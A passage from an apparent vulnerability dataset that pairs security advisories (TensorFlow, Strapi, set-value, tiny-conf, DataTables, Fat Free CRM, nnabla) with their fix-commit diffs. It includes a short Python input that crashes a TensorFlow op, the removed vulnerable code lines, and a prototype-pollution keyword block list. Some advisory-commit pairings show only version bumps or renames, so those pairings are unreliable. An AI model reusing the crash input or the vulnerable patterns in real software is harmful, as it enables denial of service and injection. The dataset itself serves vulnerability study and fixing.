std::vector<int> indices,\\n       Populate(src_data, indices, level + 1, prev_idx * shape_of_level + i,\\n                src_data_ptr, dest_data);\\n     }\\n-  } else {\\n+  } else if (prev_idx + 1 < dim_metadata_[metadata_idx].size()) {\\n     const auto& array_segments = dim_metadata_[metadata_idx];\\n     const auto& array_indices = dim_metadata_[metadata_idx + 1];\\n     for (int i = array_segments[prev_idx]; i < array_segments[prev_idx + 1];\\n          i++) {\\n-      indices[level] = array_indices[i];\\n-      Populate(src_data, indices, level + 1, i, src_data_ptr, dest_data);\\n+      if (i < array_indices.size() && level < indices.size()) {\\n+        indices[level] = array_indices[i];\\n+        Populate(src_data, indices, level + 1, i, src_data_ptr, dest_data);\\n+      }\\n     }\\n   }\\n }'}}","message_norm":"[lite] add some safety checks to avoid out of bound access for sparsity format\n\npiperorigin-revid: 416910386\nchange-id: ic0b4dc048dc4b5a6309c572b8c4c9f776e4db60a","language":"en","entities":"[('add', 'ACTION', ''), ('safety checks', 'SECWORD', ''), ('out of bound access', 'SECWORD', ''), ('416910386', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/utils\/sparsity_format_converter.cc'])","num_files":1.0},{"index":439,"vuln_id":"GHSA-4j82-5ccr-4r8v","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2426bba00a01de6913738df8fa78e0215fcce02'}","dataset":"osv","summary":"`CHECK`-failures in `TensorByteSize` in Tensorflow ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [`TensorByteSize`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/attr_value_util.cc#L46-L50) would trigger `CHECK` failures.\n\n```cc\nint64_t TensorByteSize(const TensorProto& t) {\n  \/\/ num_elements returns -1 if shape is not fully defined.\n  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();\n  return num_elems < 0 ? -1 : num_elems * DataTypeSize(t.dtype());\n}\n```\n`TensorShape` constructor throws a `CHECK`-fail if shape is partial or has a number of elements that would overflow the size of an `int`. The `PartialTensorShape` constructor instead does not cause a `CHECK`-abort if the shape is partial, which is exactly what this function needs to be able to return `-1`.\n\n### Patches\nWe have patched the issue in GitHub commit [c2426bba00a01de6913738df8fa78e0215fcce02](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2426bba00a01de6913738df8fa78e0215fcce02).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c2426bba00a01de6913738df8fa78e0215fcce02","commit_sha":"c2426bba00a01de6913738df8fa78e0215fcce02","patch":"SINGLE","chain_ord":"['c2426bba00a01de6913738df8fa78e0215fcce02']","before_first_fix_commit":"{'31d8f8035f559fc6f03516f18ca3afea652d69b0'}","last_fix_commit":"c2426bba00a01de6913738df8fa78e0215fcce02","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2021, 19:50:53","message":"Use `PartialTensorShape` instead of `TensorShape`.\n\n`TensorShape` constructor throws a CHECK-fail if shape is partial\/overflows which the other doesn't. We are only determining the number of elements in the shape and partial shape should be used as it returns negative number when needed.\n\nPiperOrigin-RevId: 409205384\nChange-Id: Ia56542ff9ec758f2c9ffc7e4dcc9fa7eecd86e7b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tensorflow\/core\/framework\/attr_value_util.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c2426bba00a01de6913738df8fa78e0215fcce02\/tensorflow%2Fcore%2Fframework%2Fattr_value_util.cc', 'patch': '@@ -45,7 +45,7 @@ constexpr int kMaxTensorNestDepth = 100;\\n \/\/ not fully defined return -1.\\n int64_t TensorByteSize(const TensorProto& t) {\\n   \/\/ num_elements returns -1 if shape is not fully defined.\\n-  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();\\n+  int64_t num_elems = PartialTensorShape(t.tensor_shape()).num_elements();\\n   return num_elems < 0 ? -1 : num_elems * DataTypeSize(t.dtype());\\n }'}}","message_norm":"use `partialtensorshape` instead of `tensorshape`.\n\n`tensorshape` constructor throws a check-fail if shape is partial\/overflows which the other doesn't. we are only determining the number of elements in the shape and partial shape should be used as it returns negative number when needed.\n\npiperorigin-revid: 409205384\nchange-id: ia56542ff9ec758f2c9ffc7e4dcc9fa7eecd86e7b","language":"en","entities":"[('overflows', 'SECWORD', ''), ('409205384', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/attr_value_util.cc'])","num_files":1.0},{"index":441,"vuln_id":"GHSA-4jqc-8m5r-9rpr","cwe_id":"{'CWE-1321', 'CWE-843'}","score":7.3,"chain":"{'https:\/\/github.com\/jonschlinkert\/set-value\/commit\/7cf8073bb06bf0c15e08475f9f952823b4576452'}","dataset":"osv","summary":"Prototype Pollution in set-value This affects the package `set-value` before 2.0.1, and starting with 3.0.0 but prior to 4.0.1. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the path parameter are arrays.","published_date":"2021-09-13","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/set-value","commit_href":"https:\/\/github.com\/jonschlinkert\/set-value\/commit\/7cf8073bb06bf0c15e08475f9f952823b4576452","commit_sha":"7cf8073bb06bf0c15e08475f9f952823b4576452","patch":"SINGLE","chain_ord":"['7cf8073bb06bf0c15e08475f9f952823b4576452']","before_first_fix_commit":"{'17ac6b7baa01f328a41987e02c73b71b5b82bc3a'}","last_fix_commit":"7cf8073bb06bf0c15e08475f9f952823b4576452","chain_ord_pos":1.0,"commit_datetime":"09\/12\/2021, 07:36:46","message":"4.0.1\n\nFixes https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33 thanks to @ready-research.","author":"Jon Schlinkert","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'package.json': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/set-value\/raw\/7cf8073bb06bf0c15e08475f9f952823b4576452\/package.json', 'patch': '@@ -1,6 +1,6 @@\\n {\\n   \"name\": \"set-value\",\\n-  \"version\": \"4.0.0\",\\n+  \"version\": \"4.0.1\",\\n   \"description\": \"Set nested properties on an object using dot notation.\",\\n   \"license\": \"MIT\",\\n   \"repository\": \"jonschlinkert\/set-value\",\\n@@ -122,4 +122,4 @@\\n       \"update\"\\n     ]\\n   }\\n-}\\n\\\\ No newline at end of file\\n+}'}}","message_norm":"4.0.1\n\nfixes https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33 thanks to @ready-research.","language":"en","entities":"[('4.0.1', 'VERSION', ''), ('https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package.json'])","num_files":1.0},{"index":449,"vuln_id":"GHSA-4mv4-gmmf-q382","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/ccf86dc5982bd8e16d11a0815c940f5b256874c9', 'https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/9780a3693572757d87bf70e48bd7555faf974f28'}","dataset":"osv","summary":"DataTable Vulnerable to Cross-Site Scripting Cross-site scripting (XSS) vulnerability in the DataTables plugin 1.10.8 and earlier for jQuery allows remote attackers to inject arbitrary web script or HTML via the scripts parameter to media\/unit_testing\/templates\/6776.php.\n\n\n## Recommendation\n\nUpdate to a version greater than 1.10.8. A [fix](https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/ccf86dc5982bd8e16d) appears in [version 1.10.10](https:\/\/github.com\/DataTables\/DataTablesSrc\/commits\/1.10.10?after=9780a3693572757d87bf70e48bd7555faf974f28+34&branch=1.10.10&qualified_name=refs%2Ftags%2F1.10.10).","published_date":"2020-08-31","chain_len":2,"project":"https:\/\/github.com\/DataTables\/DataTablesSrc","commit_href":"https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/9780a3693572757d87bf70e48bd7555faf974f28","commit_sha":"9780a3693572757d87bf70e48bd7555faf974f28","patch":"MULTI","chain_ord":"['ccf86dc5982bd8e16d11a0815c940f5b256874c9', '9780a3693572757d87bf70e48bd7555faf974f28']","before_first_fix_commit":"{'51fa58e1c6baf456fe83fbfc7bfa4082be850365'}","last_fix_commit":"9780a3693572757d87bf70e48bd7555faf974f28","chain_ord_pos":2.0,"commit_datetime":"11\/06\/2015, 15:33:43","message":"Version - 1.10.10 ready","author":"Allan Jardine","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'js\/DataTables.js': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DataTables\/DataTablesSrc\/raw\/9780a3693572757d87bf70e48bd7555faf974f28\/js%2FDataTables.js', 'patch': '@@ -1,11 +1,11 @@\\n-\/*! DataTables 1.10.10-dev\\n+\/*! DataTables 1.10.10\\n  * \u00a92008-2015 SpryMedia Ltd - datatables.net\/license\\n  *\/\\n \\n \/**\\n  * @summary     DataTables\\n  * @description Paginate, search and order HTML tables\\n- * @version     1.10.10-dev\\n+ * @version     1.10.10\\n  * @file        jquery.dataTables.js\\n  * @author      SpryMedia Ltd (www.sprymedia.co.uk)\\n  * @contact     www.sprymedia.co.uk\/contact\\n@@ -170,7 +170,7 @@\\n \\t *  @type string\\n \\t *  @default Version number\\n \\t *\/\\n-\\tDataTable.version = \"1.10.10-dev\";\\n+\\tDataTable.version = \"1.10.10\";\\n \\n \\t\/**\\n \\t * Private data store, containing all of the settings objects that are'}}","message_norm":"version - 1.10.10 ready","language":"en","entities":"[('1.10.10', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/DataTables.js'])","num_files":1.0},{"index":452,"vuln_id":"GHSA-4p4p-www8-8fv9","cwe_id":"{'CWE-824'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8'}","dataset":"osv","summary":"Reference binding to null in `ParameterizedTruncatedNormal` ### Impact\nAn attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`:\n\n```python\nimport tensorflow as tf\n    \nshape = tf.constant([], shape=[0], dtype=tf.int32)\nmeans = tf.constant((1), dtype=tf.float32)\nstdevs = tf.constant((1), dtype=tf.float32)\nminvals = tf.constant((1), dtype=tf.float32)\nmaxvals = tf.constant((1), dtype=tf.float32)\n  \ntf.raw_ops.ParameterizedTruncatedNormal(\n  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/3f6fe4dfef6f57e768260b48166c27d148f3015f\/tensorflow\/core\/kernels\/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`:\n\n```cc\nint32 num_batches = shape_tensor.flat<int32>()(0);\n``` \n\nIf `shape` argument is empty, then `shape_tensor.flat<T>()` is an empty array.\n\n### Patches\nWe have patched the issue in GitHub commit [5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8","commit_sha":"5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8","patch":"SINGLE","chain_ord":"['5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8']","before_first_fix_commit":"{'3f6fe4dfef6f57e768260b48166c27d148f3015f'}","last_fix_commit":"5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 02:14:24","message":"Fix breakage in parameterized_truncated_normal_op.cc\n\nPiperOrigin-RevId: 372041718\nChange-Id: Iff79e77a2bb27032423eefcb84211627b27dfe81","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/parameterized_truncated_normal_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8\/tensorflow%2Fcore%2Fkernels%2Fparameterized_truncated_normal_op.cc', 'patch': '@@ -627,6 +627,9 @@ class ParameterizedTruncatedNormalOp : public OpKernel {\\n         ctx, TensorShapeUtils::IsVector(shape_tensor.shape()),\\n         errors::InvalidArgument(\"Input shape should be a vector, got shape: \",\\n                                 shape_tensor.shape().DebugString()));\\n+    OP_REQUIRES(ctx, shape_tensor.NumElements() > 0,\\n+                errors::InvalidArgument(\"Shape tensor must not be empty, got \",\\n+                                        shape_tensor.DebugString()));\\n     int32 num_batches = shape_tensor.flat<int32>()(0);\\n \\n     int32 samples_per_batch = 1;'}}","message_norm":"fix breakage in parameterized_truncated_normal_op.cc\n\npiperorigin-revid: 372041718\nchange-id: iff79e77a2bb27032423eefcb84211627b27dfe81","language":"en","entities":"[('fix', 'ACTION', ''), ('372041718', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/parameterized_truncated_normal_op.cc'])","num_files":1.0},{"index":453,"vuln_id":"GHSA-4p55-xj37-fx7g","cwe_id":"{'CWE-276'}","score":0.0,"chain":"{'https:\/\/github.com\/strapi\/strapi\/commit\/3cdd73987950d5c7976701047b38203e902007bb'}","dataset":"osv","summary":"Improper Authorization in Strapi In Strapi before 3.2.5, there is no admin::hasPermissions restriction for CTB (aka content-type-builder) routes.","published_date":"2020-10-29","chain_len":1,"project":"https:\/\/github.com\/strapi\/strapi","commit_href":"https:\/\/github.com\/strapi\/strapi\/commit\/3cdd73987950d5c7976701047b38203e902007bb","commit_sha":"3cdd73987950d5c7976701047b38203e902007bb","patch":"SINGLE","chain_ord":"['3cdd73987950d5c7976701047b38203e902007bb']","before_first_fix_commit":"{'15e8a76f11c7d86ee3746efff187cbf83e220424', '4d00bc09b8bd7c0938e2d54f480d503560fcb45e'}","last_fix_commit":"3cdd73987950d5c7976701047b38203e902007bb","chain_ord_pos":1.0,"commit_datetime":"10\/22\/2020, 14:30:20","message":"Merge pull request #8439 from strapi\/fix\/ctb-permissions\n\nAdd permission to CTB routes","author":"Alexandre BODIN","comments":null,"stats":"{'additions': 42, 'deletions': 14, 'total': 56}","files":"{'packages\/strapi-plugin-content-type-builder\/config\/routes.json': {'additions': 42, 'deletions': 14, 'changes': 56, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/strapi\/strapi\/raw\/3cdd73987950d5c7976701047b38203e902007bb\/packages%2Fstrapi-plugin-content-type-builder%2Fconfig%2Froutes.json', 'patch': '@@ -5,111 +5,139 @@\\n       \"path\": \"\/reserved-names\",\\n       \"handler\": \"Builder.getReservedNames\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"\/connections\",\\n       \"handler\": \"Connections.getConnections\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"\/content-types\",\\n       \"handler\": \"ContentTypes.getContentTypes\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"\/content-types\/:uid\",\\n       \"handler\": \"ContentTypes.getContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"POST\",\\n       \"path\": \"\/content-types\",\\n       \"handler\": \"ContentTypes.createContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"\/content-types\/:uid\",\\n       \"handler\": \"ContentTypes.updateContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"\/content-types\/:uid\",\\n       \"handler\": \"ContentTypes.deleteContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"\/components\",\\n       \"handler\": \"Components.getComponents\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"\/components\/:uid\",\\n       \"handler\": \"Components.getComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"POST\",\\n       \"path\": \"\/components\",\\n       \"handler\": \"Components.createComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"\/components\/:uid\",\\n       \"handler\": \"Components.updateComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"\/components\/:uid\",\\n       \"handler\": \"Components.deleteComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"\/component-categories\/:name\",\\n       \"handler\": \"ComponentCategories.editCategory\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"\/component-categories\/:name\",\\n       \"handler\": \"ComponentCategories.deleteCategory\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     }\\n   ]'}}","message_norm":"merge pull request #8439 from strapi\/fix\/ctb-permissions\n\nadd permission to ctb routes","language":"fr","entities":"[('#8439', 'ISSUE', ''), ('permissions', 'SECWORD', ''), ('add', 'ACTION', ''), ('permission', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/strapi-plugin-content-type-builder\/config\/routes.json'])","num_files":1.0},{"index":454,"vuln_id":"GHSA-4p8f-mmfj-r45g","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/fatfreecrm\/fat_free_crm\/commit\/6d60bc8ed010c4eda05d6645c64849f415f68d65'}","dataset":"osv","summary":"Cross-site scripting in fat_free_crm Fat Free CRM before 0.18.1 has XSS in the tags_helper in app\/helpers\/tags_helper.rb.","published_date":"2019-08-21","chain_len":1,"project":"https:\/\/github.com\/fatfreecrm\/fat_free_crm","commit_href":"https:\/\/github.com\/fatfreecrm\/fat_free_crm\/commit\/6d60bc8ed010c4eda05d6645c64849f415f68d65","commit_sha":"6d60bc8ed010c4eda05d6645c64849f415f68d65","patch":"SINGLE","chain_ord":"['6d60bc8ed010c4eda05d6645c64849f415f68d65']","before_first_fix_commit":"{'557fe238a65ca94ce21e3940724ab96e55e1b27d'}","last_fix_commit":"6d60bc8ed010c4eda05d6645c64849f415f68d65","chain_ord_pos":1.0,"commit_datetime":"10\/26\/2018, 23:55:55","message":"Context-sensitive XSS bugfix.","author":"Antonin Steinhauser","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/helpers\/tags_helper.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fatfreecrm\/fat_free_crm\/raw\/6d60bc8ed010c4eda05d6645c64849f415f68d65\/app%2Fhelpers%2Ftags_helper.rb', 'patch': '@@ -17,7 +17,7 @@ def tags_for_index(model)\\n       elsif !query.include?(hashtag)\\n         query += \" #{hashtag}\"\\n       end\\n-      out << link_to_function(tag, \"crm.search_tagged(\\'#{query}\\', \\'#{model.class.to_s.tableize}\\')\", title: tag)\\n+      out << link_to_function(tag, \"crm.search_tagged(\\'#{escape_javascript(query)}\\', \\'#{model.class.to_s.tableize}\\')\", title: tag)\\n     end\\n   end'}}","message_norm":"context-sensitive xss bugfix.","language":"fr","entities":"[('sensitive', 'SECWORD', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/helpers\/tags_helper.rb'])","num_files":1.0},{"index":455,"vuln_id":"GHSA-4p92-fv6v-fhfj","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/15e519a86e4b24526abaf9e6dc81cb1af86843a5'}","dataset":"osv","summary":"Cross-site Scripting in microweber Microweber prior to 1.2.11 is vulnerable to reflected cross-site scripting.","published_date":"2022-02-27","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/15e519a86e4b24526abaf9e6dc81cb1af86843a5","commit_sha":"15e519a86e4b24526abaf9e6dc81cb1af86843a5","patch":"SINGLE","chain_ord":"['15e519a86e4b24526abaf9e6dc81cb1af86843a5']","before_first_fix_commit":"{'c897d0dc159849763a813184d9b75b966c6360bf'}","last_fix_commit":"15e519a86e4b24526abaf9e6dc81cb1af86843a5","chain_ord_pos":1.0,"commit_datetime":"02\/25\/2022, 10:57:48","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 0, 'deletions': 0, 'total': 0}","files":"{'.github\/workflows\/templates.yml': {'additions': 0, 'deletions': 0, 'changes': 0, 'status': 'renamed', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/15e519a86e4b24526abaf9e6dc81cb1af86843a5\/.github%2Fworkflows%2Ftemplates.yml', 'patch': None}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['.github\/workflows\/templates.yml'])","num_files":1.0},{"index":460,"vuln_id":"GHSA-4q2w-rw7m-xqw6","cwe_id":"{'CWE-807'}","score":9.8,"chain":"{'https:\/\/github.com\/sony\/nnabla\/commit\/e87347648ab7210529a0e60f0849680de8e9b63a'}","dataset":"osv","summary":"Sony Neural Network Libraries reliance on untrusted inputs prior to v1.0.10 nbla\/logger.cpp in libnnabla.a in Sony Neural Network Libraries (aka nnabla) prior to v1.0.10 relies on the HOME environment variable, which might be untrusted.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/sony\/nnabla","commit_href":"https:\/\/github.com\/sony\/nnabla\/commit\/e87347648ab7210529a0e60f0849680de8e9b63a","commit_sha":"e87347648ab7210529a0e60f0849680de8e9b63a","patch":"SINGLE","chain_ord":"['e87347648ab7210529a0e60f0849680de8e9b63a']","before_first_fix_commit":"{'b164980f08f3ed7740439b51d4e5ca79db0d149e', '05cd50648786cc044d3b131239299f91f399e3b8'}","last_fix_commit":"e87347648ab7210529a0e60f0849680de8e9b63a","chain_ord_pos":1.0,"commit_datetime":"11\/15\/2018, 08:24:39","message":"Merge pull request #299 from sony\/feature\/20181107-fix-getenv-usage\n\nAvoid get HOME dir with getenv.","author":"Takuya Narihira","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'src\/nbla\/logger.cpp': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sony\/nnabla\/raw\/e87347648ab7210529a0e60f0849680de8e9b63a\/src%2Fnbla%2Flogger.cpp', 'patch': '@@ -48,21 +48,21 @@ std::shared_ptr<spdlog::logger> get_logger(void) {\\n       logfile = logpath + \"\\\\\\\\nbla_lib.log\";\\n     }\\n #else\\n-    const char *homedir = getenv(\"HOME\");\\n+    const char *homedir = nullptr;\\n     if (homedir == nullptr) {\\n       struct passwd *pw = getpwuid(getuid());\\n       if (pw != nullptr) {\\n         homedir = pw->pw_dir;\\n+        logpath = homedir;\\n+        logpath += \"\/nnabla_data\";\\n+        mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n       }\\n     }\\n     if (homedir == nullptr) {\\n-      logpath = \"\/tmp_\";\\n+      logpath = \"\/tmp\/nnabla_\";\\n       logpath += getuid();\\n-    } else {\\n-      logpath = homedir;\\n+      mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     }\\n-    logpath += \"\/nnabla_data\";\\n-    mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     logpath += \"\/log\";\\n     mkdir(logpath.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);\\n     logfile = logpath + \"\/nbla_lib.log\";'}}","message_norm":"merge pull request #299 from sony\/feature\/20181107-fix-getenv-usage\n\navoid get home dir with getenv.","language":"en","entities":"[('#299', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/nbla\/logger.cpp'])","num_files":1.0},{"index":463,"vuln_id":"GHSA-4q97-fh3f-j294","cwe_id":"{'CWE-1321'}","score":9.8,"chain":"{'https:\/\/github.com\/tiny-conf\/tiny-conf\/commit\/1f7be78bc68927996647cd45b4367f8975a3ea05'}","dataset":"osv","summary":"Prototype Pollution in tiny-conf All versions of package tiny-conf up to and including version 1.1.0 are vulnerable to Prototype Pollution via the set function.","published_date":"2021-05-10","chain_len":1,"project":"https:\/\/github.com\/tiny-conf\/tiny-conf","commit_href":"https:\/\/github.com\/tiny-conf\/tiny-conf\/commit\/1f7be78bc68927996647cd45b4367f8975a3ea05","commit_sha":"1f7be78bc68927996647cd45b4367f8975a3ea05","patch":"SINGLE","chain_ord":"['1f7be78bc68927996647cd45b4367f8975a3ea05']","before_first_fix_commit":"{'c4d8b44ab53b9810b76a04caec249762d8c7fbc7', 'c1f4181bc3583fff49fe6e34c6e745479c569eb2'}","last_fix_commit":"1f7be78bc68927996647cd45b4367f8975a3ea05","chain_ord_pos":1.0,"commit_datetime":"10\/01\/2020, 08:21:02","message":"Merge pull request #1 from d3m0n-r00t\/master\n\nFixed prototype pollution","author":"Maxime Tricoire","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tiny-conf.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tiny-conf\/tiny-conf\/raw\/1f7be78bc68927996647cd45b4367f8975a3ea05\/tiny-conf.js', 'patch': \"@@ -44,6 +44,9 @@ Store.prototype = {\\n    * @return {boolean} true if set; false otherwise\\n    *\/\\n   set: function (key, val) {\\n+    if (key.includes('__proto__') || key.includes('prototype') || key.includes('constructor')){\\n+      return undefined;\\n+    }\\n     if (val === undefined) {\\n       val = key;\\n       key = null;\"}}","message_norm":"merge pull request #1 from d3m0n-r00t\/master\n\nfixed prototype pollution","language":"en","entities":"[('#1', 'ISSUE', ''), ('fixed', 'ACTION', ''), ('prototype pollution', 'SECWORD', 